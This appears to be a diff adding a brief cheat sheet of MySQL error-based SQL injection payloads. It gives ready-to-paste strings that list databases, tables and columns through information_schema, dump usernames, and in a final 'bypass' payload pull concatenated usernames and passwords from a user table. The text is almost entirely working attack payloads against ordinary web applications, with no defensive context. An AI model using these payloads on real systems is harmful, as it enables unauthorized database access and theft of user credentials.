@@ -1,0 +1,24 @@
+ [[[[]]]]  SQLI ERROR BASED 1064]]]]]]]]]
+
+search database:
+' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y);-- -+  
+
+dump table:
+' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT table_name from information_schema.tables where table_schema='database_name' limit 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y);-- -+
+
+search row:
+The limit function is useful for limiting the number of rows taken, with an initial limit and the number specified with parameters.for example:
+limit 0,1 -> first row
+limit 1,1 -> second row
+limit 2,1 -> third row
+...
+
+search columns:
+' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT column_name from information_schema.columns where table_name=0x74626c5f75736572 limit 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y);-- -+
+(table names must be encrypted to hex)
+
+dump data:
+' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT username from tbl_user limit 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y);-- -+
+
+bypass dump data:
+' and(select 1 from(select count(*),concat(0x3a,(select substr(group_concat(username,0x3a,password),1,150) from tbl_user),0x3a,floor(rand(0)*2))x from information_schema.tables group by x)z);-- -
